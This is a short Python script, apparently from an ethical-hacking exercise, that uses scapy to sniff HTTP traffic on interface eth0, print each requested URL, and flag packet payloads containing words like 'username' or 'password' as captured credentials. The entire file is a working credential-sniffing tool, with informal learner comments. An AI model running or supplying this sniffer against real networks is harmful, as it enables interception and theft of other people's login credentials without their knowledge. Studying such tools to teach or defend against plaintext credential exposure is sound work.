#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    #Dont store captured packets, prn specify call back function it will be call every time when function capture packer
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request >> " + url.decode()) #.decode way to converting byte objet to string

        if packet.haslayer(scapy.Raw):
            #Print specific field inside Raw layer
            load = str(packet[scapy.Raw].load) #Load variable will be converted to string
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print("\n\n[+] Possible user/password > " + load + "\n\n")
                    break

sniff("eth0")
